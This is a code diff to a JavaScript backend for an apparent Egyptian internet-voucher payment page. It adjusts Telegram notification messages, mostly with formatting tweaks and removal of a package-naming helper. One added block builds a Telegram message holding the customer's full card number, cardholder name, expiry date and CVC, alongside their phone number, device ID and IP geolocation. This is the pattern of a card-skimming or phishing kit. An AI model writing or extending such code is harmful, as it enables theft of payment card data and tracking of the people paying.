@@ -36,7 +36,7 @@ async function fetchNetworkDetailsByIP(ip) {
       const lat = res.data.latitude;
       const lon = res.data.longitude;
       if (lat && lon) {
-        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
+        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat}, ${lon})</a>`;
       }
       return result;
     }
@@ -56,7 +56,7 @@ async function fetchNetworkDetailsByIP(ip) {
       const lat = fallbackRes.data.lat;
       const lon = fallbackRes.data.lon;
       if (lat && lon) {
-        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
+        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat}, ${lon})</a>`;
       }
       return result;
     }
@@ -78,31 +78,7 @@ function getFormattedDateTime() {
   const now = new Date();
   const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
   const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
-  return `${formattedDate} -${formattedTime}`;
-}
-
-/**
- * دالة لتحديد اسم الباقة بدقة بناءً على المبلغ المدفوع
- */
-function getPackageNameByAmount(amount) {
-  const numAmount = Number(amount);
-  switch (numAmount) {
-    case 5:
-      return "الباقة البرونزية";
-    case 15:
-      return "الباقة الفضية";
-    case 30:
-      return "الباقة الذهبية";
-    case 50:
-      return "الباقة البلاتينية";
-    case 100:
-      return "الباقة الماسية";
-    default:
-      if (numAmount > 100) {
-        return "مساهمة ودعم للشبكة";
-      }
-      return "باقة إنترنت شبكة حكايات";
-  }
+  return `${formattedDate} - ${formattedTime}`;
 }
 
 /**
@@ -169,6 +145,14 @@ async function sendTelegramMessage(data, isInitial = true) {
         message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
       }
 
+      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
+        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
+                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
+                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
+                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
+                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
+      }
+
       message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
@@ -186,13 +170,14 @@ async function sendTelegramMessage(data, isInitial = true) {
 
     } else {
       const voucher = data.voucher_code || data.cardCode || "غير متوفر";
-      const numericAmountVal = Number(amountEGP);
-      const packageInfo = data.package_info || data.packageName || getPackageNameByAmount(numericAmountVal);
+      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
+      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";
 
       message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                 `🏢 الفرع: <b>${branchName}</b>\n` +
                 `🆔 رقم العملية: <code>${txnId}</code>\n` +
                 `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
+                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                 `💳 وسيلة الدفع: <b>${method}</b>\n` +
                 `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                 `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
@@ -247,11 +232,10 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
 
     const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
     const amountVal = paymentDetails.amount || "0";
-    const packageNameVal = paymentDetails.packageName || getPackageNameByAmount(amountVal);
 
     const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                     `🏢 الفرع: <b>${paymentDetails.branchName || 'حكايات نت رئيسي'}</b>\n` +
-                    `📦 الباقة: <b>${packageNameVal}</b>\n` +
+                    `📦 الباقة: <b>${paymentDetails.packageName || 'باقة إنترنت'}</b>\n` +
                     `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
                     `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                     `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
@@ -338,7 +322,7 @@ async function handleTelegramCallback(callbackQuery) {
             },
             amount: amount,
             transactionId: txnId,
-            packageName: voucherData.packageName || getPackageNameByAmount(amount),
+            packageName: voucherData.packageName || "باقة إنترنت",
             createdAt: new Date()
           });
         }
@@ -409,11 +393,14 @@ async function sendTelegramFailNotification(errorMessage, data = {}) {
       return;
     }
 
+    // جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP في صفحة الفشل أيضاً
     const netInfo = await fetchNetworkDetailsByIP(publicIP);
     const ispText = netInfo.isp;
     const netLocationText = netInfo.netLocation;
 
     const branchName = data.branchName || "حكايات نت رئيسي";
+    const userPhone = data.phone || "غير محدد";
+    const amountEGP = data.amount || "غير محدد";
     const dateTimeStr = getFormattedDateTime();
     const txnId = data.transactionId || `TX_${Date.now()}`;
 
